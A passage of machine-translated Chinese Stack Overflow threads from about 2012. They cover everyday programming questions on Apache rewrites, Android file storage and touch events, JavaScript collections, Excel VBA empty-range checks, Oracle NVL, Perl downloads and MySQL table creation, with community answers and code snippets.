[perdir D:/p/] RewriteCond: input='D:/p/inc/style.css' pattern='^(.+)/([^/]+)$' => matched
[perdir D:/p/] RewriteCond: input='D:/p/inc/inc/style.css' pattern='-f' => not-matched

// Of course it will never match, it should be D:/p/inc/style.css

...
...
... 
```

谢谢，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T15:08:25.237

使用此 RewriteCond 允许不超过 1 个内部重定向：

```
## prevent looping from internal redirects
RewriteCond %{ENV:REDIRECT_STATUS} !200 
```

# android - android-向服务器发送文本文件

> ID：10811086
> 
> 赞同：0
> 
> 时间：2012-05-30T06:34:26.443
> 
> 标签：android, file-upload

我有一个 android 应用程序，如果我有任何异常，它会将其写入文件（文件存储在设备的内部存储器中）.....现在我想知道是否可以将此文件发送到我的本地主机服务器.

提前致谢

编辑：下面的代码是我用来上传图片的代码......

```
 try {

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Bitmap bm=bitmap;
        bm.compress(CompressFormat.PNG, 75, bos);

        byte[] data = bos.toByteArray();

        HttpClient httpClient = new DefaultHttpClient();
        String url="192.168.1.1**";
        HttpPost postRequest = new HttpPost(url+"uploadimage");

        ByteArrayBody bab = new ByteArrayBody(data, imageName);

        MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);

        reqEntity.addPart("uploadfile", bab);

        //reqEntity.addPart("photoCaption", new StringBody("sfsdfsdf"));

        postRequest.setEntity(reqEntity);

        HttpResponse response = httpClient.execute(postRequest);

        BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity().getContent(), "UTF-8"));

        String sResponse;

        StringBuilder s = new StringBuilder();

        while ((sResponse = reader.readLine()) != null) {

            s = s.append(sResponse);

        }

        System.out.println("Response: " + s);

    } catch (Exception e) {

        // handle exception here

        Log.e(e.getClass().getName(), e.getMessage());

    } 
```

同样我想上传一个文件（文本文件）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:52:00.890

> 现在我想知道是否可以将此文件发送到我的本地主机服务器

是的，有可能。

看看你原来的要求，我建议你看看[**ACRA**](http://code.google.com/p/acra/)。

# security - Gnome Keyring：如何安全地生成/存储密钥环密码？

> ID：10811087
> 
> 赞同：1
> 
> 时间：2012-05-30T06:34:30.913
> 
> 标签：security, passwords, gnome-keyring-daemon

我正在制作一个将用户访问凭据存储在 Gnome 密钥环中的 vala 应用程序。如果应用程序不存在密钥环，我想创建一个；但是，我想创建一个新的密钥环。不幸的是，我不知道如何安全地为新密钥环生成密码，也不知道如何将其存储在某个地方，以便我的应用程序以后可以使用它。由于它是一个开源项目，我认为我不应该将它硬编码到我的程序中并将其存储在隐藏的 conf 文件中会破坏使用密钥环的目的。

我怎样才能安全地生成它然后存储它？

# java - Java 脚本集合框架

> ID：10811088
> 
> 赞同：9
> 
> 时间：2012-05-30T06:34:31.673
> 
> 标签：java, javascript, collections

就像 Java 有它的 Collection Framework 一样。`Javascript`哪里有可用的api

我们可以将 JSON 对象存储在映射中的键值对和

它将具有排序功能和

列表或矢量功能，其大小将自动增长，并且

HashSet/TreeSet 功能来存储重复的自由 Json 对象或项目。

**编辑：**

ListI 迭代器功能将在那里我们可以双向遍历。

它缺少的另一个功能是可以实现从数组中间删除项目，以便在之后重新排列。

比较器设施将是一个额外的优势。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T06:44:36.520

不，这些特性中的大部分都是 JavaScript 原生的。

*   每个 javascript 对象都只是键值对（而且，主要是原型......） - 你知道 **J** ava **S** cript **O** bject **Notation**吗？
*   列表和向量都被自动增长的原生 Array 类型覆盖
*   所有数组都继承[sort()](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/sort)方法，并提供自定义比较器方法
*   ...而且您不需要很长时间就可以找到从对象/数组中删除重复项的片段。即使使用自定义比较器。
*   （已编辑）：所有数组都继承[splice()](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/splice)方法以从 indizes 中删除项目
*   ListIterators：从 ES5.1 开始，所有数组都有[迭代方法](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array#Iteration_methods)，这些方法与 JavaScript 的函数式方法配合得很好

然而，有一些库可以扩展这些功能。例如 underscore.js 将对象和数组都视为可迭代的集合，存在用于通过非字符串键等存储值的 HashMap 实现。此外，几乎所有 MVC 框架都实现了自己的集合对象（用于模型）以跟上他们身上的变化。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T08:26:13.220

我已经`HashTable`用任意键和`HashSet`我的[jshashtable](http://code.google.com/p/jshashtable)实现了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T06:47:47.497

尝试查看 Backbone JS，我认为您可以使用它的模型和集合。网站[http://backbonejs.org/](http://backbonejs.org/)和这里的教程[http://backbonetutorials.com/](http://backbonetutorials.com/)

谢谢，

苏丹

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-30T06:40:11.327

Javascript 的内置数组是“可自动增长的”，实际上与您从 Java 中的 Collection 获得的功能非常相似。

但是，如果您需要类似 HashSet 的东西，您可以查看[TaffyDB](http://taffydb.com/)，它应该是 Javascript 的“数据库”，但我认为它可以在内存中工作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-30T06:44:28.503

ExtJs（肯定）和（我认为）jQuery 有这样的功能。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-05-05T10:57:35.750

您可以使用下面提到的库。做吧`npm install collectiondatalib`。

**特点**：[www.npmjs.com/package/collectiondatalib](https://www.npmjs.com/package/collectiondatalib)

它非常易于使用，并且所有集合搜索和排序方法都可用。

# apache-flex - 如何将我现有的 Flex3.6 应用程序移植到移动 iO、Android 平台

> ID：10811094
> 
> 赞同：2
> 
> 时间：2012-05-30T06:35:00.003
> 
> 标签：apache-flex, air, packager-for-iphone

我有一个使用 Flex 3.6 sdk 的 Flex Web 应用程序。移植此应用程序 iO 和 Android 设备的所有方法是什么。

在发布 Flash builder 4 之前，我已将我的 Flex 3.6 项目转换为 AIR 2.0。（这需要非常少的代码更改）并使用一些命令行工具将其打包为 .ipa 和 .apk。成功将其部署在 iPad 上。应用程序按预期工作。这就是我所记得的，我完全忘记了两年前我遵循的程序。

现在在 Flash builder 4 中，有一个选项可以创建“移动项目”，只需右键单击项目 - 导出 - 发布构建即可将应用程序导出到不同的移动平台。

但是[这个页面](http://help.adobe.com/en_US/flex/mobileapps/WSf3db6597adcd110e19124fcb12ab3a1c319-8000.html)告诉“除了 MX 图表控件和 MX Spacer 控件，移动应用程序不支持 mx.* 包中定义的 MX 组件集。”

现在我真的很困惑要遵循哪种方法。

有人可以澄清这些吗

1.  将 Flex3.6 Web 应用程序移植到 iO 和 Android 设备的所有方法是什么？
2.  我是否需要将我的 Flex3.6 项目转换为 Flex 4 项目，并将所有 MX 组件更改为 Spark 组件（这需要对我的项目进行重大更改）以获得移动平台支持。
3.  有没有其他方法可以将我现有的 Flex3.6 应用程序移植到移动设备上，而代码更改非常少。（我知道需要注意 UI 大小等更改）

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:48:47.907

首先，从用户体验的角度来看，我不认为将您的 Web 应用程序重用为移动应用程序是一个很好的主意，除非界面非常简单（这不能保证一开始就可以使用完整的 Flex 应用程序地方）。

*   屏幕尺寸如此不同以至于它可能无法使用，或者至少不舒服
*   您没有定义触摸交互

但要回答您的问题：移动组件是完全不同的组件集。它们更轻量级并且针对移动交互进行了优化。为了获得这种性能提升，他们基于 Spark 架构。意思就是：

1.  无法移植您的 Flex 3 代码
2.  是的，你必须转换
3.  我想不出任何其他方式来移植您的应用程序；最少的代码更改是不可能的

**结论**

将应用程序从 Web (Flex 3) 自动移植到移动设备在技术上是不可能的，而且 - 即使是这样 - 由于 UX 问题不推荐使用，这让我提出了这个建议：从从头开始，既要为移动设备处理干净、优化的代码，又要设计适合目标平台的 UI。

# perl - 使用 perl 下载页面的 html

> ID：10811104
> 
> 赞同：0
> 
> 时间：2012-05-30T06:35:36.010
> 
> 标签：perl

我正在使用以下代码来获取页面的 html。

```
 #!C:\Perl64\bin\perl.exe
    use strict;
    use warnings;
    use WWW::Mechanize;
    my $url=$ARGV[0];
    my $mech=new WWW::Mechanize();
    $mech->get($url,":content_file" => "C:\\path\\www\\page.html"); 
```

上面的代码适用于某些站点，但其他站点（如 wikipedia）需要添加 agent_alias。但是，每当我添加 agent_alias 时，page.html 都会显示一些废话。

```
$mech->agent_alias('Windows IE 6'); 
```

我试图添加其他别名，但它没有任何区别。我该怎么做才能正确获取所有页面的 html(source)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T16:23:10.083

我对 libwww-perl 有更好的体验：

```
require LWP::UserAgent;
$ua->agent('Mozilla/5.0');
$response = $ua->get('http://search.cpan.org/'); 
```

# android - 应用程序数据文件实际存储在 android 设备上的什么位置？

> ID：10811108
> 
> 赞同：20
> 
> 时间：2012-05-30T06:36:05.610
> 
> 标签：android, file, titanium, appcelerator

我使用 Appcelerator Titanium 开发了一个 Android 应用程序。这个应用程序将在 applicationDataDirectory 中创建一个文件并安装一个数据库。

如果在模拟器上运行，我可以使用“adb”命令找到这些文件。但是在Android设备上呢？我可以使用“我的文件”应用程序查看我创建的那些文件吗？（因为我可以在那里看到其他应用程序创建的文件。）

此外，我希望一旦我删除设备上的应用程序，它会自动删除相关文件和数据库。真的吗？

因为我发现即使我从设备中删除了应用程序，数据库似乎也被遗忘了。我可以说，因为在删除应用程序并在设备上重新运行（来自 Titanium）后，它会显示以前的数据。

我正在使用 Ti SDK 2.0.1GA2，Android 运行时 V8。并使用三星 Galaxy Tab 进行测试。提前致谢。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-05-30T06:52:59.543

应用程序私有数据文件存储在`<internal_storage>/data/data/<package>`

可以使用[openFileOutput()](http://developer.android.com/reference/android/content/Context.html#openFileOutput%28java.lang.String,%20int%29)和[openFileInput()访问存储在内部存储中的文件](http://developer.android.com/reference/android/content/Context.html#openFileInput%28java.lang.String%29)

当这些文件被创建为[MODE_PRIVATE](http://developer.android.com/reference/android/content/Context.html#MODE_PRIVATE)时，无法在另一个应用程序（例如 FileManager）中查看/访问它们。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-04-25T09:48:43.133

在 Android 4.4 KitKat 上，我在以下位置找到了我的： `/sdcard/Android/data/<app.package.name>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-24T13:35:01.493

使用 Context.getDatabasePath(databasename)。可以从您的应用程序中获取上下文。

如果您取回以前的数据，则可能是 a) 数据存储在非常规位置，因此不会在卸载时删除，或者 b) Titanium 使用应用程序备份了数据（它可以这样做）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-27T21:52:41.230

您可以从您的 document_cache 文件夹、子文件夹（我的是 1946507）中获取 if。在那里，通过将 .pdf 添加到文件末尾来重命名“内容”，保存并使用任何 pdf 阅读器打开。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-08-31T02:33:58.627

这是识别特定应用程序的应用程序相关存储路径的简单方法。

**脚步：**

1.  将 android 设备连接到您的 mac 或 android 模拟器打开
2.  打开终端
3.  亚行外壳
4.  寻找 。

“寻找”。命令将在终端中列出所有文件及其路径。

```
./apex/com.android.media.swcodec
./apex/com.android.media.swcodec/etc
./apex/com.android.media.swcodec/etc/init.rc
./apex/com.android.media.swcodec/etc/seccomp_policy
./apex/com.android.media.swcodec/etc/seccomp_policy/mediaswcodec.policy
./apex/com.android.media.swcodec/etc/ld.config.txt
./apex/com.android.media.swcodec/etc/media_codecs.xml
./apex/com.android.media.swcodec/apex_manifest.json
./apex/com.android.media.swcodec/lib
./apex/com.android.media.swcodec/lib/android.hidl.memory.token@1.0.so
./apex/com.android.media.swcodec/lib/libcodec2_soft_common.so
./apex/com.android.media.swcodec/lib/android.hardware.graphics.mapper@2.0.so
./apex/com.android.media.swcodec/lib/libcodec2_soft_vorbisdec.so
./apex/com.android.media.swcodec/lib/libcodec2_soft_h263dec.so
./apex/com.android.media.swcodec/lib/libhidltransport.so
./apex/com.android.media.swcodec/lib/libcodec2_soft_h263enc.so
./apex/com.android.media.swcodec/lib/libcodec2_vndk.so
./apex/com.android.media.swcodec/lib/android.hardware.graphics.mapper@2.1.so
./apex/com.android.media.swcodec/lib/libmedia_codecserviceregistrant.so
./apex/com.android.media.swcodec/lib/libhidlbase.so
./apex/com.android.media.swcodec/lib/libcodec2_soft_aacdec.so
./apex/com.android.media.swcodec/lib/libcodec2_soft_vp9dec.so
..... 
```

之后，只需使用捆绑标识符搜索您的应用程序，您就可以使用 adb pull 命令将文件下载到本地目录。

# python - 用于 LAMP 的 Python 2.7 或 3.0

> ID：10811112
> 
> 赞同：0
> 
> 时间：2012-05-30T06:36:26.620
> 
> 标签：python, python-3.x, lamp, python-2.x

我将构建网页和网络界面。到目前为止，我一直在使用带有 PHP 的 LAMP 堆栈。我想转向python。两个 Python 版本（2.7 或 3.1）中的哪一个更适合这种用途？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T06:40:22.957

mod_wsgi 直到 3.2 才真正使用 3.x，所以我现在坚持使用 2.7。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T06:53:45.943

[《Thoughts on python3》](http://lucumr.pocoo.org/2011/12/7/thoughts-on-python3/)是 Flask Web 框架 Armin Ronacher 的作者写的一篇很棒的文章。如果您想深入了解“Why not use Python 3 for web YET”，本文将回答所有问题。底线是：现在坚持使用 Python 2。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T06:48:42.620

首先，这将取决于您选择使用哪个框架——例如 django 不能在 3.x 上运行。

除此之外，这取决于您对*只*使用 apache 的执着程度。如果您只想使用 apache + 模块，请注意 Ignacio 的建议。如果您可以使用辅助网络服务器，您可以尝试使用 gunicorn 或[uwsgi 的这种方法：通过 mod_proxy 的 gunicorn 重定向到项目范围之外，尽管 ProxyPassReverse](https://stackoverflow.com/questions/6418016/gunicorn-via-mod-proxy-is-redirecting-outside-of-the-projects-scope-despite-pr)

# ipad - 在 Cocos2D 中的 renderTexture 上设置的框架

> ID：10811116
> 
> 赞同：0
> 
> 时间：2012-05-30T06:36:43.050
> 
> 标签：ipad, cocos2d-iphone

我是 cocos2D 的新手，我想在其中画线，我试图从[这里实现](https://i.stack.imgur.com/aS37W.png)

我在其中设置的框架有问题。我通过以下代码设置背景图像

CCSprite* 背景 = [CCSprite spriteWithFile:imgPath rect:frame];

其中 imgPath 是设置为 CCSprite 的图像文件的路径，而 frame 是视图边界。CCSprite的框架没问题，现在我加了

```
 [background addChild: [LineDrawingClass node]]; 
```

然后我使用以下代码片段将 CCRenderTexture 实例添加到 LineDrawingClass

renderTexture.anchorPoint = ccp(0, 0);
renderTexture.position = ccp(self.width * 0.5f, self.height * 0.5f);

然后我将 renderTexture 添加到 LineDrawingClass

我得到的是 CCSprite 的背景设置为正确的帧，没有问题，但 renderTexture 的帧设置在 CCSprite 下方大约五个像素。

我还将锚点设置为

renderTexture.anchorPoint = ccp(0.5f, 0.5f);

但是 renderTexture 的 origin.y 的滞后仍然存在。

请参阅附图以供参考。有人可以指出错误并纠正我，renderTexture 的框架正好在 CCSprite 的框架之上（现在与 origin.y 滞后 5px）？

![在此处输入图像描述](../Images/bd54025f9e963db61fc9070777c240c3.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T10:46:51.963

尝试将纹理的高度设置得稍大一些，如果 480 是您的高度，请将其设置为 580 或大于可以满足您的要求的高度。

```
renderTexture.position = ccp(self.width * 0.5f, (self.height + 100) * 0.5f); 
```

它是因为一些方向问题。

# excel - 检测范围是否为空

> ID：10811121
> 
> 赞同：40
> 
> 时间：2012-05-30T06:37:06.717
> 
> 标签：excel, vba, range

我想检查 Excel 中的范围是否为空。

如何用 VBA 代码编写：

```
If Range("A38":"P38") is empty 
```

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2012-05-30T07:15:21.847

从我得到的评论中找到了解决方案。

```
Sub TestIsEmpty()
    If WorksheetFunction.CountA(Range("A38:P38")) = 0 Then
        MsgBox "Empty"
    Else
        MsgBox "Not Empty"
    End If
End Sub 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2018-11-07T20:03:14.670

如果您发现自己处于无法使用的情况，`CountA`那么首先将您的范围存储为数组并循环数组数据比循环范围/单元格数据要快得多。

```
Function IsRangeEmpty(ByVal rng As Range) As Boolean
    'Converts a range to an array and returns true if a value is found in said array

    Dim area As Range
    For Each area In rng.Areas

        If area.Cells.Count > 1 Then

            'save range as array
            Dim arr As Variant
            arr = area.value

            'loop through array
            Dim cel As Variant
            For Each cel In arr

                'if cell is not empty then
                If Len(Trim(cel)) > 0 Then
                    IsRangeEmpty = False
                    Exit Function
                End If

            Next cel

        Else    'cannot loop on array with one value

            'if cell is not empty then
            If Len(Trim(area.Value2)) > 0 Then
                IsRangeEmpty = False
                Exit Function
            End If

        End If

    Next area

    IsRangeEmpty = True

End Function 
```

* * *

如何使用它的示例：

```
Sub Test()
    Debug.Print IsRangeEmpty(Range("A38:P38"))
End Sub 
```

如果`Range("A38:P38")`为空，则`True`在即时窗口中打印；否则它会打印`False`。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2016-06-27T13:25:48.157

如果变量未初始化或显式设置为 Empty，则 IsEmpty 返回 True；否则，它返回 False。如果表达式包含多个变量，则始终返回 False。IsEmpty 仅返回对变体有意义的信息。（[https://msdn.microsoft.com/en-us/library/office/gg264227.aspx](https://msdn.microsoft.com/en-us/library/office/gg264227.aspx)）。因此，您必须分别检查范围内的每个单元格：

```
 Dim thisColumn as Byte, thisRow as Byte

    For thisColumn = 1 To 5
        For ThisRow = 1 To 6
             If IsEmpty(Cells(thisRow, thisColumn)) = False Then
                 GoTo RangeIsNotEmpty
             End If
        Next thisRow
    Next thisColumn
    ...........
    RangeIsNotEmpty: 
```

当然，这里的代码比使用计数非空单元格的 CountA 函数的解决方案要多，但是如果找到至少一个非空单元格，GoTo 可以中断循环，并且可以更快地执行代码，特别是在范围很大并且您需要检测这种情况时。此外，与不是 VBA 函数的 Excel CountA 函数相比，这段代码对我来说更容易理解它在做什么。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-07-30T13:47:28.810

```
Dim M As Range

    Set M = Selection

If application.CountIf(M, "<>0") < 2 Then
    MsgBox "Nothing selected, please select first BOM or Next BOM"
Else

'Your code here

End If 
```

根据我刚刚了解到的经验，您可以这样做：

```
If Selection.Rows.Count < 2 
Then End If` 
```

稍后提供澄清（现在我正在工作）

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2018-05-04T14:26:11.350

```
Dim cel As Range, hasNoData As Boolean

    hasNoData = True
    For Each cel In Selection
        hasNoData = hasNoData And IsEmpty(cel)
    Next 
```

`True`如果没有单元格`Selection`包含任何数据，这将返回。对于特定范围，只需 `RANGE(...)`替换`Selection`.

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-09-04T00:59:04.120

另一种可能的解决方案。计算空单元格并从单元格总数中减去该值

```
Sub Emptys()

Dim r As range
Dim totalCells As Integer

'My range To check'
Set r = ActiveSheet.range("A1:B5")

'Check for filled cells'
totalCells = r.Count- WorksheetFunction.CountBlank(r)

If totalCells = 0 Then
    MsgBox "Range is empty"
Else
    MsgBox "Range is not empty"
End If

End Sub 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-04-07T10:35:07.507

`@TomM's` [这只是对答案](https://stackoverflow.com/a/50177273)的一点补充/一个简单的功能来检查您的选择的单元格是否为空

```
Public Function CheckIfSelectionIsEmpty() As Boolean
   Dim emptySelection As Boolean:emptySelection=True
   Dim cell As Range
   For Each cell In Selection
       emptySelection = emptySelection And isEmpty(cell)
       If emptySelection = False Then
          Exit For
       End If
   Next
   CheckIfSelectionIsEmpty = emptySelection
End Function 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-01-27T09:00:16.713

恕我直言，这条单行效果更好：

```
Application.Evaluate("SUMPRODUCT(--(E10:E14<>""""))=0") 
```

在这种情况下，它评估范围 E10:E14 是否为空。

# objective-c - 目标c中的rtf子弹字符

> ID：10811130
> 
> 赞同：-1
> 
> 时间：2012-05-30T06:37:57.210
> 
> 标签：objective-c, nsstring, rtf

有谁知道这行代码是否适用于 iOS 上 rtf 文件中的 NSString？

```
NSString* cList = [[NSString alloc] initWithContentsOfFile:@"name of file" encoding:NSUTF8StringEncoding error:nil];
c = [cList componentsSeparatedByString:@"\n•    "]; 
```

我只是想知道，因为它包含一个我几乎复制粘贴的项目符号字符。我没想到会这么容易。看起来它应该是一个转义序列字符或其他东西。

可能应该在第一行中包含某种形式的错误检查，但暂时不考虑。

**更新：**在使用 rtf 多次编译但没有成功后，我将文本复制到 txt 并改用它。第一次工作。似乎 rtf 读取得到了奇怪的 rtf 数据，这并不是我在尝试 NSLog 时所追求的。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:09:33.010

使用 unicode 序列怎么样？像...

```
c = [cList componentsSeparatedByString:@"\n\u0000    "]; 
```

0000 <---- Unicode。

# android - TouchEvent 同时执行 if 和 else 部分

> ID：10811131
> 
> 赞同：3
> 
> 时间：2012-05-30T06:38:01.780
> 
> 标签：android, touch-event

在下面的代码中，我面临的问题是在 onTouchListener 方法中，if 和 else 部分每次都被执行。有人知道为什么会这样吗？并且我的项目的目标是在 web 视图中的任何位置发生触摸事件，停靠布局必须出现在另一个触摸上，它必须消失。有人可以帮忙吗？

提前致谢 ..

```
 public class MathiasdockActivity extends Activity {
    /** Called when the activity is first created. */
    RelativeLayout upperdock,parent;
    LinearLayout tocbottom,tocparent;
    boolean flag=true;
    WebView wv;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        parent=(RelativeLayout) findViewById(R.id.rl1);
        upperdock=(RelativeLayout) findViewById(R.id.upperdock);
        tocparent=(LinearLayout) findViewById(R.id.tocparent);
        tocbottom=(LinearLayout) findViewById(R.id.linearLayout3);
        upperdock.setVisibility(RelativeLayout.INVISIBLE);
        tocparent.setVisibility(LinearLayout.INVISIBLE);
        tocbottom.setVisibility(LinearLayout.INVISIBLE);
        wv = (WebView) findViewById(R.id.webView1);  
        wv.loadUrl("file:///android_asset/hotspot/07-03.html");
        wv.getSettings().setJavaScriptEnabled(true);

        wv.setOnTouchListener(new OnTouchListener() {

            public boolean onTouch(View v, MotionEvent event) {

                    if(flag)
                    {
                            Toast toast1 = Toast.makeText(getBaseContext(), Boolean.toString(flag) + "if", 1000);
                            toast1.show();
                            upperdock.bringToFront();
                            tocparent.bringToFront();
                            tocbottom.bringToFront();
                            upperdock.setVisibility(RelativeLayout.VISIBLE);
                            tocparent.setVisibility(LinearLayout.VISIBLE);
                            tocbottom.setVisibility(LinearLayout.VISIBLE);
                            flag=false;
                    }
                    else
                    {
                            Toast toast2 = Toast.makeText(getBaseContext(), Boolean.toString(flag) + "else", 1000);
                            toast2.show();
                            wv.bringToFront();
                            upperdock.setVisibility(RelativeLayout.INVISIBLE);
                            tocparent.setVisibility(LinearLayout.INVISIBLE);
                            tocbottom.setVisibility(LinearLayout.INVISIBLE);
                            flag=true;  

                    }

                    return flag;
            }
        });
    }
   } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:43:18.017

这是因为`OnTouchListener`连续调用，所以你需要检查用户是否第一次触摸`MotionEvent.ACTION_DOWN`

```
wv.setOnTouchListener(new OnTouchListener() {

        public boolean onTouch(View v, MotionEvent event) {

        if(event.getAction()== MotionEvent.ACTION_DOWN)
        {
                if(flag)
                {
                   Toast toast1 = Toast.makeText(getBaseContext(), Boolean.toString(flag) + "if", 1000);
                   toast1.show();
                   upperdock.bringToFront();
                   tocparent.bringToFront();
                   tocbottom.bringToFront();
                   upperdock.setVisibility(RelativeLayout.VISIBLE);
                   tocparent.setVisibility(LinearLayout.VISIBLE);
                   tocbottom.setVisibility(LinearLayout.VISIBLE);
                   flag=false;
                }
                else
                {
                   Toast toast2 = Toast.makeText(getBaseContext(), Boolean.toString(flag) + "else", 1000);
                   toast2.show();
                   wv.bringToFront();
                   upperdock.setVisibility(RelativeLayout.INVISIBLE);
                   tocparent.setVisibility(LinearLayout.INVISIBLE);
                   tocbottom.setVisibility(LinearLayout.INVISIBLE);
                   flag=true;
                }
          }
              return flag;
        }
    }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T06:43:28.880

看起来两者都在同时执行。实际上，它们是分开执行的，但**由于触摸事件的触发速度如此之快，因此它们似乎是同时执行的**。你应该做的是首先检测运动事件的类型，例如，`MotionEvent.ACTION_MOVE`或其他东西。否则，所有运动事件都由您的侦听器代码处理。

当然，在您的代码中调用`if`and的原因`else`是因为您在每个语句中将标志设置为 true 和 false，以便语句的执行交替执行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T06:45:21.760

触摸事件有很多动作，所以请在 if 条件下使用它。

```
1.MotionEvent.ACTION_DOWN
2.MotionEvent.ACTION_MOVE
3.MotionEvent.ACTION_UP
.
.
.
etc 
```

**而且总是`return false;`**

**更新**

```
if(event.getAction()== MotionEvent.ACTION_DOWN)
{
  //when you touch on screen
}
else if(event.getAction()== MotionEvent.ACTION_MOVE)
{
    //when you move your finger on screen
}
else if(event.getAction()== MotionEvent.ACTION_UP)
{
  //when you release your finger from screen
} 
```

# sql - Oracle Nvl 和 to_char 函数

> ID：10811134
> 
> 赞同：2
> 
> 时间：2012-05-30T06:38:06.333
> 
> 标签：sql, performance, oracle

现在，我必须在proc中修改一条SQL，唯一的修改是在select子句中添加一个带有nvl和to_char函数的列，在where子句中没有修改。
我的问题是，这种修改会导致任何性能问题吗？

SQL 演示如下：

原始SQL：

```
Select a.c1, b.c2 from a, b where a.c3=b.c4 
```

修改后：

```
Select a.c1, b.c2, nvl(to_char(b.c5,'FM00000000'), '.       ') As c5 from a, b where a.c3=b.c4 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:02:59.773

此更改不太可能导致明显的性能下降。

oracle 查询中成本最高的部分将是连接和 where 子句指定的数据选择。你没有改变它。您返回的行数将是相同的。两个函数调用会导致每行返回的成本非常低，并且每行返回的数据略多，但与行选择相比，这可能可以忽略不计。

# c++ - 以随机顺序接收行时压缩位矩阵

> ID：10811145
> 
> 赞同：2
> 
> 时间：2012-05-30T06:39:06.613
> 
> 标签：c++, c, cuda, compression, bytearray

我正在使用一个`Nx3`行`N`数非常大的位矩阵，比如说`2^40`。
一个典型的矩阵是这样的

```
000
001
010
011
... 
```

我做这样的事情

```
transform_row(5); //return 000
transform_row(10); //return 101
assemble_array(000,101); 
//return a 10x3 matrix, where:
//row 5: 000
//row 10: 101
//the other rows wait for the other iteration to be filled

...//repeat 
```

`initial_matrix`my和中的位模式`transformed_matrix`要么非常冗余，要么非常备用。例如，第一列可以只有`0`，也可以有巨大的`1`.

在这种情况下，我有哪些组装和有效压缩的选择？
我应该推出自己的组装算法，还是可以使用一些压缩库？
我正在考虑自己动手，因为我不知道压缩库是否可以在这种连续情况下有效地工作。

我`assemble_array`在 GPU 上并行执行。
所以函数需要是线程安全的、关联的和可交换的。

bit_matrix_transform.cu

```
bit_matrix initial_matrix;
first=0;
last=2^40;
UnaryFunction bit_vector transform_row::operator(long row_index);
BinaryFunction bit_matrix assemble_array::operator(bit_array x, bit_array y);
bit_matrix transformed_matrix = thrust::transform_reduce(first, last, transform_row, init, assemble_array);
//a bit_array being either a bit_vector or a bit_matrix 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T15:36:28.183

我将从数组的简单游程表示开始，将其初始化为 2^40 个零的运行。（或者，如果零与空不同，则使用 -1 或 8。）初始运行长度表示将只是 2^40, 0。当您插入一个元素时，您会将一次运行分成两个。因此，要将 111 放在位置 n（从零开始计数），您会得到 n, 0, 1, 7, 2^40-n-1, 0。如果我在第一个相邻的位置插入另一个 111，我会这样做一次运行：n, 0, 2, 7, 2^40-n-2, 0。依此类推。

如果位级别的相关性多于三位级别，则执行此操作 3 次，每列位执行一次。

# tabs - Facebook 应用程序添加到个人资料

> ID：10811154
> 
> 赞同：1
> 
> 时间：2012-05-30T06:39:46.943
> 
> 标签：tabs, add, profile, facebook-iframe

我想使用 iframe 在我的 facebook 应用程序中包含添加到配置文件或添加到时间线代码。FBML 有一个简单的方法来做到这一点。iframe 似乎并非如此。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T08:44:34.250

Facebook 即将删除“添加到个人资料”和“添加到时间线”插件。查看开发者路线图：http: [//developers.facebook.com/roadmap/](http://developers.facebook.com/roadmap/)。另外，请记住，FBML 支持将在 6 月 / 7 月被删除。

如果用户连接到您的应用程序，那么您的应用程序将被添加到他们的时间线中，前提是用户手动将框添加到他们的个人资料中。您不能再将自定义应用程序添加到用户的配置文件中，您只能发布故事（使用`publish_stream`）或发布操作（使用`publish_actions`）。

# mysql - 如何在单个查询中创建几个表。MySQL

> ID：10811157
> 
> 赞同：2
> 
> 时间：2012-05-30T06:40:04.570
> 
> 标签：mysql, sql, database

我需要使用 php 在 mysql 中创建 5-10 个表，但我认为有比创建 10 个查询更好的方法，所以我的问题是，如何使用单个查询来做到这一点？有可能吗？每张桌子都不一样。

```
$sql = "CREATE TABLE IF NOT EXISTS `db_countries` (
           `countrykey` int(11) NOT NULL,
           `countrynamelat` varchar(500) NOT NULL default '',
            PRIMARY KEY  (`countrykey`)
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8";

mysql_query($sql);

  $sql2 = "CREATE TABLE IF NOT EXISTS `db_city`(
